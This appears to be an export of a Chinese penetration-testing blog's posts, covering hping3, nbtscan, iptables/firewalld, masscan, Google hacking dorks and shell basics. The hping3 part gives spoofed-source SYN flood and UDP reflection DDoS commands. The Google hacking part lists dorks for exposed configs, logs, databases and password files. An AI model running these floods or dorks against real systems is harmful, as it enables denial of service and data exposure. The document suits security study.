   // 缺省随机源端口\n  -k  --keep       keep still source port      // 保持源端口\n  -w  --win        winsize (default 64)        // win的滑动窗口。windows发送字节(默认64)\n  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)    // 设置伪造tcp数据偏移量(取代tcp地址长度除4)\n  -Q  --seqnum     shows only tcp sequence number        // 仅显示tcp序列号\n  -b  --badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。\n  -M  --setseq     设置TCP序列号 \n  -L  --setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)\n  -F  --fin        set FIN flag\n  -S  --syn        set SYN flag\n  -R  --rst        set RST flag\n  -P  --push       set PUSH flag\n  -A  --ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）\n  -U  --urg        set URG flag      // 一大堆IP抱头的设置。\n  -X  --xmas       set X unused flag (0x40)\n  -Y  --ymas       set Y unused flag (0x80)\n  --tcpexitcode    使用last tcp-> th_flags作为退出码\n  --tcp-mss        启用具有给定值的TCP MSS选项\n  --tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime\n\nCommon //通用设置\n  -d  --data       data size    (default is 0)    // 发送数据包大小，缺省是0。\n  -E  --file       文件数据\n  -e  --sign       添加“签名”\n  -j  --dump       转储为十六进制数据包\n  -J  --print      转储为可打印字符\n  -B  --safe       启用“安全”协议\n  -u  --end        告诉你什么时候--file达到EOF并防止倒回\n  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)\n  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出\n  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳\n  --tr-no-rtt       不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）\nARS packet description (new, unstable)\n  --apd-send       发送APD描述数据包(参见docs / APD.txt)\n```\n\n\n\n**常用模式**\n\n```bash\n-0 --rawip \t# IP原始报文\n-1 --icmp\t# ICMP模式\n-2 --udp \t# UDP模式\n-8 --scan\t# 扫描模式\n-9 --listen\t# 监听模式\n\n```\n\n\n\n#### 常用方式\n\n```bash\n## SYN方式扫描主机端口\nhping --scan 1-30,70-90 -S www.target.host\nhping --scan 445,135 -S 192.168.0.110\n#目标主机回复的 'S..A'，代表SYN/ACK\n\n\n## 测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击(DoS attack)。\n#例如，以LandAttack方 式测试目标防火墙(Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接)。\n# -a 伪造源地址\nhping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c\n\n\n## DRDDOS(UDP反射DDoS攻击)  -c发包的数量\nhping3 --udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5\n```\n\n\n\n使用hping3进行flood DoS攻击：\n\n```bash\nhping3 -c 5000 -d 150 -S -w 64 -p 80 --flood <10.0.40.246>\n-c：发送数据包的个数\n-d：每个数据包的大小\n-S：发送SYN数据包\n-w：TCP window大小\n-p：目标端口，你可以指定任意端口\n--flood：尽可能快的发送数据包\n--rand-source :使用随机的Source IP Addresses.\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["DDOS"],"categories":["渗透测试"]},{"title":"nbtscan","url":"%2Fposts%2F26997%2F","content":"\n\n\n> 当我们处于局域网中\n\n> 用来探测内网存活主机\n\n\n\nkali中已经安装了：\n\n```bash\nroot@xps:~# whereis nbtscan\nnbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz\nroot@xps:~# nbtscan \n\nNBTscan version 1.6.\nThis is a free software and it comes with absolutely no warranty.\nYou can use, distribute and modify it under terms of GNU GPL 2+.\n\nUsage:\nnbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(<scan_range>) \n\t-v\t\tverbose output. Print all names received\n\t\t\tfrom each host\n\t-d\t\tdump packets. Print whole packet contents.\n\t-e\t\tFormat output in /etc/hosts format.\n\t-l\t\tFormat output in lmhosts format.\n\t\t\tCannot be used with -v, -s or -h options.\n\t-t timeout\twait timeout milliseconds for response.\n\t\t\tDefault 1000.\n\t-b bandwidth\tOutput throttling. Slow down output\n\t\t\tso that it uses no more that bandwidth bps.\n\t\t\tUseful on slow links, so that ougoing queries\n\t\t\tdon't get dropped.\n\t-r\t\tuse local port 137 for scans. Win95 boxes\n\t\t\trespond to this only.\n\t\t\tYou need to be root to use this option on Unix.\n\t-q\t\tSuppress banners and error messages,\n\t-s separator\tScript-friendly output. Don't print\n\t\t\tcolumn and record headers, separate fields with separator.\n\t-h\t\tPrint human-readable names for services.\n\t\t\tCan only be used with -v option.\n\t-m retransmits\tNumber of retransmits. Default 0.\n\t-f filename\tTake IP addresses to scan from file filename.\n\t\t\t-f - makes nbtscan take IP addresses from stdin.\n\t<scan_range>\twhat to scan. Can either be single IP\n\t\t\tlike 192.168.1.1 or\n\t\t\trange of addresses in one of two forms: \n\t\t\txxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.\nExamples:\n\tnbtscan -r 192.168.1.0/24\n\t\tScans the whole C-class network.\n\tnbtscan 192.168.1.25-137\n\t\tScans a range from 192.168.1.25 to 192.168.1.137\n\tnbtscan -v -s : 192.168.1.0/24\n\t\tScans C-class network. Prints results in script-friendly\n\t\tformat using colon as field separator.\n\t\tProduces output like that:\n\t\t192.168.0.1:NT_SERVER:00U\n\t\t192.168.0.1:MY_DOMAIN:00G\n\t\t192.168.0.1:ADMINISTRATOR:03U\n\t\t192.168.0.2:OTHER_BOX:00U\n\t\t...\n\tnbtscan -f iplist\n\t\tScans IP addresses specified in file iplist.\n\t\t\n\n# 参数\n-a\t列出为其主机名提供的远程计算机名字表。\n-A\t列出为其IP地址提供的远程计算机名字表。\n-c\t列出包括了IP地址的远程名字高速缓存器。\n-n\t列出本地NetBIOS名字。\n-r\t列出通过广播和WINS解析的名字。\n-R\t消除和重新加载远程高速缓存器名字表。\n-S\t列出有目的地IP地址的会话表。\n-s\t列出会话表对话。\n```\n\n\n\n#### 示例\n\n```bash\n## 以：分割显示\n\n## Linux上\n\nnbtscan -v -s : 192.168.117.130\n\n# 扫描整个C段\nnbtscan -r 192.168.1.0/24\n\n# 扫描一个范围\nnbtscan 192.168.1.25-137\n\n\n# 从文件读取扫描范围\nnbtscan -f <File>\n\n\n## Windows上\nnbtscan.exe -m 192.168.1.0/24\n```\n\n\n\n#### 高级用法\n\n```bash\nnbtscan -v -s ' ' 192.168.117.130\n \nnbtscan -v -s ' ' 192.168.117.130 | awk '{print $1}' |uniq\n```\n\n\n\n\n\n\n\n#### 这个工具的运行流程：\n\n遍历输入的IP范围，以广播MAC地址发送ARP查询，一旦接收到ARP回复，遍记录相应的IP与MAC地址，同时向对方发送NBNS消息查询对方的主机信息打印出每条信息\n\n\n\n\n\n其他探测内网主机的方法：http://www.360doc.com/content/19/1129/18/13328254_876375955.shtml","tags":["网络工具"],"categories":["渗透测试"]},{"title":"iptables包过滤与网络地址转换","url":"%2Fposts%2F23022%2F","content":"\n\n\n## iptables\n\n#### 功能\n\n4个表`raw`和`mangle`，`nat`,`filter`（后两个表用的多）\n\n```bash\niptables -t filter -nvL\t# -t显示哪个表\n```\n\n三个链(Chain)：`INPUT`,`FORAWRD`(转发规则链),`OUTPUT`\n\n\n\n#### 特点\n\n- 比较老,逐渐被取代\n- 基于命令行\n- 难度最高\n\n#### 用法\n\n```bash\niptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]\n\n# 注意事项：\n不指定表名时，默认指filter表\n不指定链名时，默认只表内是所有链\n除非设置链的默认策略。否则必须指向匹配条件\n选项、链名、控制类型使用大写字母，其余均为小写\n\n```\n\n几种控制类型\n\n```bash\nACCEPT  # 允许流量通过\nREJECT    # 明确拒绝(比如ping时候的\"主机不可达\")\nDROP        # 对方不知道你是否在线(显示超时)\nLOG\t\t# 记录日志信息\n```\n\n\n\n规则优先顺序：`自上而下`\n\n\n\n#### 包过滤\n\n用法\n\n```bash\niptables -L    # 显示所有的策略\niptables -F       # \"清空所有\"策略\niptables -F FORWARD\t# 清空FORWARD表所有规则\niptables -P INPUT DROP     # 默认禁止所有流量策略,不能reject\n\n## 参数\n-I   # 插入到最前面(用的较多)\n-A   # 插入到最后面(用的较少)\n-D\t # 删除\n-p   # 允许的协议\n--dport     # 本机端口（属于隐含匹配，要配合通用匹配使用）\n-s    # 来源地址\n-d\t  # 目的地址\n-i\t  # 入站网卡\n-o\t  # 出站网卡\n-j    # 本身为意义，后面跟动作\n\n-L\t# 列出所有规则条目\n-n:\t# 以数字形式显示地址、端口等信息\n-v:\t# 以更详细的方式显示规则信息\n--lines-numbers: # 查看规则时，显示规则的序号\n-mac-source MAC地址\t# MAC地址匹配（属于显式匹配）\n\n\niptables -I  INPUT -p icmp -j ACCEPT  #只允许外部到内部的ping\n\niptables -I INPUT -s 192.168.10.0/24 -d 0.0.0.0 -p tcp  --dport 22 #允许来自某个网段的访问，端口为22\n\n-D #删除某一条\niptables -D INPUT 1  #删除第一条(后面跟行号)\n\niptables -I INPUT -p tcp --port 22 -j REJECT  #禁止外部所有22端口的流量\n\niptables -I INPUT -p tcp --port 22:200 -j REJECT  #禁止外部所有20到200端口的流量\n\n# 保存规则（永久生效）\nservice iptables save\n\n# 导出当前规则状态\niptables-save > /usr/share/1.txt\n# 从文件导入规则\niptables-restore < /usr/share/1.txt\n\n```\n\n \n\n\n\n#### 网络地址转换(NAT)\n\n> NAT表\n\n\n\n```bash\n# 查看NAT表规则 \niptables -t nat -nvL\n\n路由后规则（POSTROUTING）\n\n## 设置规则\n# -s 是给内网的谁做转换, --to-source是转为网关的地址\niptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source 12.34.56.78 \n\n# 如果网关地址是动态的，就这样\niptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source -j MASQUERADE\n\n## 配置FORWARD链的转发限制\n\n\n```\n\n\n\n#### 目标地址转换(DNAT)\n\n> 情景：外网机器访问内网机器\n\n使用链：`路由前规则（PREROUTING）`\n\n\n\n```bash\n# 查看NAT表规则 \niptables -t nat -nvL\n\n# 设置规则，访问内网主机的8080端口（网关的80映射到内网主机的8080）\niptables -t nat PREROUTING -i eth1 -d 12.34.56.78 -p tcp --dport 80 -J DNAT --to-destination 192.168.1.1:8080\n```\n\n\n\n\n\n\n\n\n\n## firewalld 防火墙\n\n```bash\nzone  #区域\nsbit    #安全位\npublic    #默认策略,当前使用\n```\n\n\n\n```bash\nRuntime  # 当前生效，重启后失效\nPremanent # 当前暂时不生效，但是永久生效\n--premanent       # 建议添加这个\n\nfirewall-cmd -reload     #重启\n\nfirewall-cmd --get-default-zone    #查看当前区域\n\nfirewall-cmd --set-default-zone=drop    #切换默认区域到丢包\n\nfirewall-cmd --permanent --zone=drop --change-interface=en0167777  #重启之后，把这个网卡区域换为drop\nfirewall-cmd --permanent get-zone-of-interface=en0167777  #重启之后，查看\n\n##紧急模式\nfirewall-cmd --panic-on    #切断所有网络连接，包括ping的数据包\nfirewall-cmd --panic-off    #关闭紧急模式\n\n##查询服务\nfirewall-cmd --zone=public --query-service=http    #查看是否允许http\nfirewall-cmd --zone=public --query-service=ssh\n\n##添加允许服务\nfirewall-cmd --zone=public --add-servcice=http    #允许从外访问http服务\n\nfirewall-cmd --zone=public --add-servcice=https    #重启才可以 firewall-cmd --reload\nfirewall-cmd --zone=public --add-servcice=https\n\n##禁止服务\nfirewall-cmd --zone=public --remove-servcice=https\n\nfirewall-cmd --permanent --zone=public --add-servcice=https\nfirewall-cmd --permanent --zone=public --query-servcice=https    \n\n\n##添加端口号\nfirewall-cmd --zone=public --add-port=8080/tcp    #把这个端口添加到tcp协议组，允许\nfirewall-cmd --zone=public --add-port=80-90/tcp    #端口端\n\n\n##端口转发（隐藏原始端口）\nfirewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10    #转发888到22\nfirewall-cmd --reload\n\n\n##复规则（复规则）\n##精准匹配\nfirewall-cmd --permanent --zone=public --add-rich-rule=\"rule family\"=\"ipv4\" source address=\"192.168.10.0/24\" service name=\"ssh\" reject\"\n\nfirewall-cmd reload\n\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["NAT"],"categories":["Linux"]},{"title":"masscan","url":"%2Fposts%2F39667%2F","content":"\n\n\n> masscan号称是世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口，但是这个是由条件的4核电脑，双端口10G网卡\n\n\n\n项目地址： https://github.com/robertdavidgraham/masscan\n\n\n\n#### 安装\n\n###### Linux上\n\n```bash\nsudo apt-get install git gcc make libpcap-dev\ngit clone https://github.com/robertdavidgraham/masscan\ncd masscan\nmake\n```\n\n\n\n###### Windows上\n\n因为我用的Linux比较多，所用没安过Windows的，请参考：https://www.cnblogs.com/flaray/p/11213730.html\n\n\n\n#### 使用\n\n###### 常用命令\n\n```bash\nmasscan 172.16.0.0/16 -p0-65535 --banners --append-output  -oL scan_result.list  --max-rate 10000\n\n\n# 扫描ip列表文件\nmasscan -iL ip.txt -p0-65535 --banners --append-output  -oL scan_result.list  --max-rate 10000\n\n\n# 输出json格式     -Oj\nmasscan -iL ip.txt -p80,443,3306 --banners --append-output  -oJ result.json  --max-rate 10000\n\n# Note: 发包速率(--max-rate)不要太大，且Linux下比Windows速度快\n\n\n\n--adapter-ip \t# 指定发包的IP地址\n--adapter-port \t# 指定发包的源端口\n--adapter-mac\t# 指定发包的源MAC地址\n--router-mac \t# 指定网关的MAC地址\n--exclude \t\t# IP地址范围黑名单,防止masscan扫描\n--excludefile\t# 指定IP地址范围黑名单文件\n--includefile,-iL # 读取一个范围列表进行扫描\n--wait\t\t\t# 指定发送完包之后的等待时间,默认为10秒\n```\n\n\n\n\n\n###### Python脚本解析masscan扫描结果\n\n> 是基于json输出格式(-OJ)的\n\n```python\n# Author：https://www.jianshu.com/p/b6edaa3acbbf\n\nimport json\nfrom openpyxl import Workbook\nimport xlsxwriter\nimport socket\ndef get_list(filepath):\n    f = open(filepath,encoding='utf-8')\n    c = json.load(f)\n    list = []\n    for i in c:\n        ip = i['ip']\n        port = str(i['ports'][0]['port'])\n        status = 'open'\n        try:\n            if i['ports'][0]['service']:\n                name = i['ports'][0]['service']['name']\n                banner = str(i['ports'][0]['service']['banner'])\n        except:\n            name = ''\n            banner = ''\n        line = [ip,port,status,name,banner]\n        list.append(line)\n    return list\ndef quchong(l1):\n    l2 =[]\n    for data1 in l1:\n        for data2 in l1:\n            if data1[0]==data2[0] and data1[1]==data2[1]:\n                if data1[3] ==''and data2[3] !='':\n                    # print(data1,data2)\n                    l2.append(data1)\n    for i in l2:\n        try:\n            l1.remove(i)\n        except:pass\n    l1 = [list(t) for t in set(tuple(_) for _ in l1)]\n    return l1\n\ndef write_excle(list):\n    f = xlsxwriter.Workbook('port.xlsx')\n    worksheet1 = f.add_worksheet('扫描信息')\n    worksheet2 = f.add_worksheet('主机ip列表')\n    worksheet1.write(0, 0, 'ip')\n    worksheet1.write(0, 1, '端口')\n    worksheet1.write(0, 2, '状态')\n    worksheet1.write(0, 3, '服务')\n    worksheet1.write(0, 4, 'banner')\n    worksheet2.write(0, 0, '主机ip')\n    newlist= []\n    for i in list:\n        newlist.append(i[0])\n    newlist=set(newlist)\n    total1 = 0\n    total2 = len(newlist)\n    newlist=sorted(newlist, key=socket.inet_aton)\n    for index, p in enumerate(list):\n        total1+=1\n        for j, q in enumerate(p):\n            worksheet1.write(index + 1, j, q)\n    for index, p in enumerate(newlist):\n        worksheet2.write(index + 1, 0, p)\n    f.close()\n    return total1,total2\nif __name__ == '__main__':\n    filepath = 'C:/1/result.json'  #填写要解析masscan扫描json格式报告的文件路径\n    result = get_list(filepath)\n    result = quchong(result)\n    sum = write_excle(result)\n    print('共检测到存活主机%d个，端口信息%d条'% (sum[1],sum[0]))\n\n```\n\n","tags":["信息搜集"],"categories":["渗透测试"]},{"title":"Google Hacking","url":"%2Fposts%2F3409%2F","content":"\n## 基本\n\n通配符\n\n```bash\n通配符\t\t\t\t语义\t\t\t\t说明\t\t\t\t\t示例\n+\t\t\t\t包含关键词\t\t+前面必须要有一个空格\t\t\t admin +login\n-\t\t\t\t排除关键词\t\t-前面必须要有一个空格\t\t\t mysql -csdn\n~\t\t\t\t同义词\t\t\t ~前面必须要有一个空格\t\t  mysql -csdn\n*\t\t\t\t模糊查询\t\t*代替任意字符\t\t\t\t\tmysql**\n\"\"\t\t\t\t强调\t\t\t\t\t\t\t\t\t\t \"mysql\"\n\n```\n\n\n\n\n\n# 高级操作符\n\n## 概述\n\n**将学习如下的高级操作符：**\n\n- intitle, allintitle\n- related\n- inurl, allinurl\n- phonebook\n- filetype\n- rphonebook\n- allintext\n- bphonebook\n- site\n- author\n- link\n- group\n- inanchor\n- msgid\n- daterange\n- insubject\n- cache\n- stocks\n- info\n- define\n\n\n\n## 操作符语法\n\n基本语法：`operator`:`search_term`\n\n#### 原则\n\n- 在操作符、冒号、搜索关键字之间是没有空格的；\n- 布尔操作符和特殊字符(例如`OR`和`+`)仍可用于高级操作符查询，但是不能把它们放在冒号之前而把冒号和操作符分开；\n- `ALL`操作符(以单词ALL开头的操作符)非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用；\n- 操作符搜索的搜索关键字部分的语法和前一章中讲到的关键字语法是一样的。 例如，你可以使用一个单词或者用引号引起来的词组作为关键字。如果用词组作为关键字的话，须保证在操作符、冒号和词组的第一个引号之间没有任何空格字符。\n\n\n\n#### 实例\n\n- `intitle:Google`这个查询将返回标题包含单词Google的页面。\n- `intitle:\"index of\"`这个查询将返回标题包含词组index of的页面。回忆前一章中学到的知识，我们可以知道这个查询也可以写成\n- `intitle:index.of`,因为句号可以匹配任意字符。利用这种技术，我们可以避免键入词组中的空格以及两端的引号。”\n- `intitle:\"index of\" private` 这 个查询将返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含单词private的页面。要注意的是，intitle 只对词组index of起作用，而不会影响单词private,这是因为引号外的第一个空格位于词组index of之后。Google把这个空格解释为高级操作符搜索关键字的结尾，然后接着处理查询中剩下的部分。\n- `intitle:\"index of\" \"bakcup files\"`这 个查询返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含词组backup files的 页面。同样要注意到intitle仅对词组index of起作用。\n\n\n\n\n\n#### 正文\n\n###### Intitle 与 Allintitle\t：在页面标题中搜索\n\nps：只有在单词`intitle`后面的单词或词组才被认为是查询关键字，而`Allintitle`没有这一规则\n\n**例如：**\n\n`intitle:\"index of\" \"backup files\"`\n\n`Allintitle:\"index of\" \"backup files\"`\t每个链接的文档标题中都找到了两个词，更精确\n\n>慎重使用allintitle操作符。在和其他高级操作符一起使用时，它就显得非常笨拙，而且会\n>打乱整个查询，使得无法得到结果。也许有些极端，但是即便在一次查询中使用一-串intitle也\n>好过使用拙劣的allintitle.\n\n\n\n\n\n###### intext  与 Allintext\t：在网页内容里查找字符串\n\n由于这个操作符是以单词all开头的，所以在它之后的每个搜索关键字都将作为查询语句的一部分。\n\n> 基于这个原因，alintext操作符不能和其他的高级符混合使用。\n\n\n\n###### Inurl 与 Allinurl\t\t：在URL中查找文本\n\n\n\n###### Site \t\t：把搜索精确到特定的站点\n\n注意：Google是`从左到右`读取服务器名的\n\n\n\n\n\n###### Filetype\t\t：搜索指定类型的文件\n\n`filetype:pdf`\n\n**常见的文件拓展名：**\n\n```bash\npdf\nps\nwk1, wk2, wk3, wk5, wki, wks, wku\nLwp\nMw\nXls\nPpt\nDoc\nwks, wps, wdb\nWri\nRtf\nSwf\nans, txt\nhtml\nhtm\nphp\nasp\ncfm\naspx\njsp\nCGI\nDO\nPL\nXML\nDOC\nPHTML\nPHP3\nTXT\nEXE\nXLS\nPPT\n\n```\n\n\n\n> 提示：ext操作符可以用来替代filetype. filetye:xls查 询与ext:xIs等价。\n\n\n\n\n\n###### Link\t\t：搜索与当前网页存在链接的网页\n\n`link:www.baidu.com`\n\n\n\n\n\n###### Inanchor\t\t：在链接文本中查找文本\n\n可以和link操作符相比较使用，因为都能用来搜索链接。但是inachor操 作符搜索的是一个链接的文本表示，而不是实际的URL 。\n\n> inanchor 操作符搜索的是锚点，或者说是链接上显示的文本\n\n\n\n\n\n###### Cache\t\t：显示网页的缓存版本\n\n\n\n###### Numrange\t\t：搜索数字\n\nnumrang操作符需要`两个参数`，一个是最小数，一个是最大数，以破折号分隔。\n\n例如，查找12345：`numrange:12344-12346`或简写`12344..12346`\n\n\n\n\n\n###### Daterange\t：查找在某个特定日期范围内发布的网页\n\n这个操作符的参数通常也必须表示为`一个范围`，即用破折号分开的两个日期。如果你只想查找某个特定日期索引的网页，必须提供同样的日期两次，并以破折号分开。\n\n\n\n\n\n###### Info\t\t：显示Google的摘要信息\n\n该操作符的参数必须是: `一个有效的URL或者网站名`。\n\n\n\n\n\n###### Related\t：显示相关站点\n\n\n\n###### Author \t：搜索Groups中新闻组帖子的作者\n\n\n\n###### Group\t  ：搜索Group标题\n\n可以用来在Google Groups帖子的标题中搜索含有关键字的帖子。\n\ngroup操作符并不能很好地和其他操作符混合使用。\n\n\n\n###### Insubject\t：搜索Google Group主题行\n\ninsubject操作符实际上和intitle搜索是一样的，它们返回同样的结果。\n\n\n\n###### as_Msgid\t\t：通过消息ID来查找Group帖子\n\n\n\n\n\n###### Stocks\t\t：搜索股票信息\n\n这个操作符的参数必须是一个有效的股票简称\n\n> stocks操作符不能和其他的操作符 及搜索关键字同时使用。\n\n\n\n\n\n###### Define\t：显示某个术语的定义\n\n\n\n> define操作符不能和其他操作符或搜索关键字混合使用。\n\n\n\n###### Phonebook\t\t：搜索电话列表\n\nphonebook操作符可以用来搜索商业和住宅电话列表。\n\n例如：`phonebook: john ny`是johb在\n\n\n\n###### view\t\t：以什么形式展示\n\n在Web查询的结尾放上`view:map`或者y`view:timeline`，以便在地图视图或者一个酷酷的时间轴视图中查看结果。\n\n\n\n###### 其他操作符\n\n。。。。。。\n\n\n\n#### 操作符的混合使用\n\n<img src=\"http://image.xpshuai.cn/googlehack.png\"> </img>\n\n\n\n\n\n\n\n\n\n\n\n# 基础\n\n#### 使用缓存进行匿名浏览\n\n可以实现`匿名`浏览，如果配合代理服务器效果更好：通过语法查找`inurl:\"nph-prxy.cgi \"start browsing\"`等\n\n选项`cached text only`其实是添加了换一个`&strip=1`参数，强制只显示缓存文本，禁止任何外部引用\n\n\n\n>Google的缓存版本页面会对搜索关键字进行高亮显示。但是你可能还不知道可以使用Google的\n>高亮工具在缓存网页中高亮显示某些并不包含在原始搜索中的关键字。\n\n\n\n\n\n#### 目录列表\n\n查找目录列表：`intitle:\"index.of\" \"parent directory\"` 其中`.`是通配符\n\n查找特定目录：`intitle:index.of.admin`或`intitle:index.of inurl:admin`\n\n查找特定的文件：`filetype:log inurl:ws_ftp.log`，使用filetype和inurl来查找\n\n服务器版本：`intitle:index.of server at`\n\n服务器版本：`intitle:index.of Apache/1.3.24 Server at` 等（其他服务器...）\n\n搜索目标是否有列目录\n\n```bash\nsite:\"xpshuai.cn\" intext:index of/ | ../ | Parent Directory\n```\n\n\n\n#### 遍历\n\n目录遍历：`intitle:index.of inurl:\"/admin/\"`和`intitle:index.of inurl:\"/var/www/\"`等等\n\n递增置换（“取一个数并用下一个更大的或者更小的数来替代这个数”的形象的说法）\n\n拓展遍历（用于查找文件名相同，但是拓展名不同的文件如备份文件-->一旦你找到了HTM文件，就可以应用置换技术来查找具有相同的文件名，但扩展名不同的文件）\n\n\n\n\n\n\n\n\n\n# 文档加工与数据库挖掘\n\n#### 配置文件\n\n`inurl:conf OR inurl:config OR inurl:cfg`\n\n**Google黑客在搜索配置文件时常考虑的几点：**\n●使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索。\n●过滤掉sample. example、 test. howto和tutorial单 词以剔除明显的示例文件。升5 6 sm\n●用-cvs过滤掉CVS存储器，它们通常存放了默认的配置文件。\n●如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual（`-manpage`）\n●搜索示例配置文件中最常改变的域，并且对该域执行缩简搜索，以剔除可能的“垃圾”或者样例文件。\n\n**常见的配置文件搜索示例：**\n\n<img src=\"http://image.xpshuai.cn/google_conf1.jpg\"></img>\n\n<img src=\"http://image.xpshuai.cn/google_conf2.jpg\"></img>\n\n\n\n\n\n#### 日志文件\n\n例如：`filetype:log username putty`\n\n\n\n#### Office文档\n\n**搜索可能敏感的Office文档的查询样例：**\n\n<img src=\"http://image.xpshuai.cn/google_office.jpg\"></img>\n\n\n\n\n\n#### 数据库挖掘\n\n###### 登录入口\n\n不管登录入口的安全强弱程度如何，它的存在都暴露了目标可能使用的软件和硬件的类型。简单来说，登录入口非常适合于顺藤摸瓜。\n\n\n\n###### 帮助文件\n\n\n\n###### 错误消息\n\n<img src=\"http://image.xpshuai.cn/google_error1.jpg\"> </img>\n\n<img src=\"http://image.xpshuai.cn/google_error1.jpg\"> </img>\n\n<img src=\"http://image.xpshuai.cn/google_error3.jpg\"> </img>\n\n<img src=\"http://image.xpshuai.cn/google_error4.jpg\"> </img>\n\n\n\n\n\n###### 数据库转储\n\n<img src=\"http://image.xpshuai.cn/google_zuanchu.jpg\"></img>\n\n\n\n###### 实际的数据库文件\n\n如：`filetype\"mdb inurl:user.mdb`\n\n\n\n\n\n# 其他信息搜索\n\n#### 确定E-mail地址\n\n1.查找邮件服务器：`host -t mx qq.com` 、 Windows上：`nslookup -Cqtype=mx qq.com`\n\n2.挑选出一个服务器，并且远程登录到端口25：`telnet mx1.qq.com 25 `\n\n3.伪装简单邮件传送协议(SMTP)\n\n4.正面测试\n\n5.反面测试\n\n6.完成，可以确定某个邮箱存在\n\n\n\n#### 确定电话号码\n\n通过Google的数字范围(numrange)操作符在一个特定的范围内查找包含的电话号码\n\n先指定起始数字，接着键入`..`，再键入终止数字。\n\n\n\n#### 确定人\n\n\n\n\n\n#### 特殊的操作符\n\n`filetype:ppt site:www.****.gov`\n\n\n\n\n\n\n\n# 搜索exp与查找目标\n\n#### 搜索公开的exp站点\n\n如：`filetype:c exploit`\n\n然后分离url：`grep cached exp |awk-F \"-\" '{print $1}'| sort -u`\n\n\n\n\n\n#### 通过常见代码字符串搜索exp\n\n\n\n#### 利用Google代码搜索查找代码\n\n\n\n#### 搜索恶意软件和可执行文件\n\n\n\n#### 利用源代码搜索目标\n\n\n\n\n\n# 简单有效的安全性搜索\n\n\n\n```bash\n\n\nerror | warning\nlogin | logon\nusername |userid |employee.ID | \"your username is\"\npassword | \"your password is\" site:edu.cn\n\n# -ext 必须和site一起用\nsite:edu.cn\t-ext:html\t# 排除html的文件类型\n\n# 临时文件、备份目录\ninurl:tmp | inurl:temp | inurl:backup | inurl:bak\n```\n\n\n\n\n\n\n\n# 跟踪搜索Web服务器、登录入口和网络硬件\n\n#### 定位并剖析Web服务器\n\n1.目录列表\n\n2.Web服务器软件的错误消息\n\n3.默认文档\n\n4.示例程序\n\n\n\n\n\n\n\n# 用户名、口令和其他秘密信息\n\n搜索用户名\n\n搜索口令\n\n信用卡账号\n\n社保号码\n\n个人财务数据\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["搜索引擎"],"categories":["渗透测试"]},{"url":"%2Fposts%2F1%2F","content":"title: shell脚本基本知识\ncategories: Linux\ntags:\n\n  - Linux\n  - Shell\nabbrlink: 44249\ndate: 2020-03-16 17:01:17\nkeywords:\ndescription:\n\n<img src=\"http://image.xpshuai.cn/title.jpg\"></img>\n\n<!-- more -->\n\n\n\n## 应用场景\n\n- 自动批量系统初始化（update，软件安装，时区设置，安全策略...）\n\n- 自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx)\n\n- 管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID）\n\n- 日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk）\n\n- 自动化备份恢复程序(MySQL完全/增量备份 + Crond)\n\n- 自动化管理程序(批量远程修改密码，软件升级，配置更新)\n\n- 自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net...）\n\n- 配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net...）\n\n- 自动化扩容（增加云主机->部署应用）\n\n- Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线）\n\n  \n\n  \n\n> 程序的组成： 逻辑 + 数据\n\n\n\n\n\n## 基本用法\n#### 一.常识\n\n**1.输入输出重定向**\n\n```bash\n## 文件描述符：0，1,2    (对应：进程输入的文件，进程输入的文件，进程打开错误的文件)\n0表示标准输入\n1表示标准输出\n2表示标准错误输出\n\n## 输入输出重定向\n# >, >>\n> 默认为标准输出重定向，与 1> 相同\n2>&1 把标准错误输出 重定向到 标准输出.\n&>a.txt 把标准输出 和 标准错误输出 都重定向到文件中\n\n# 2>, 2>>   错误输出最佳\n# 2>>&1, &>   描述符为2的内容输入到描述符为1的内容(&> 是混合输出)\ncat < /etc/hosts  #（没加任何参数） 和不加<的机制不一样\ncat < /etc/hosts > test/aaa.txt  # 相当于copy文件内容\ncat << EOF   # 输入内容让cat来执行\ncat <<EOF > file1   # 把一会输入的文件放到文件里面去 \n\n# 混合重定向  输出到/dev/null就是什么都不显示到终端\n&> /dev/null      \n```\n\n**2.一些快捷键**\n\n```bash\n# ^R   搜索历史命令\n# ![number]      